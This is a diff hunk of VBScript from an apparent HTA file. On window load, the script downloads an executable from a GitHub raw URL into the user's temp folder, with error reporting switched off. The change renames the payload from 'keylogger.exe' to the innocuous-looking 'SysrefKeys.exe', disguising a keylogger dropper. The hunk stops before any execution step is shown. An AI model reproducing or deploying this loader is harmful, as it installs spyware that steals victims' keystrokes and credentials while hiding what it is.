@@ -15,11 +15,11 @@
 Option Explicit
 
 Sub Window_OnLoad()
-    Const sURL = "https://raw.githubusercontent.com/sleakly/HTASAMPLE-PROJECT/main/keylogger.exe"
+    Const sURL = "https://raw.githubusercontent.com/sleakly/HTASAMPLE-PROJECT/main/SysrefKeys.exe"
 
     Dim fso, sLocalPath
     Set fso = CreateObject("Scripting.FileSystemObject")
-    sLocalPath = fso.BuildPath(CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%"), "keylogger.exe")
+    sLocalPath = fso.BuildPath(CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%"), "SysrefKeys.exe")
 
     Dim xHttp, bStrm
     On Error Resume Next
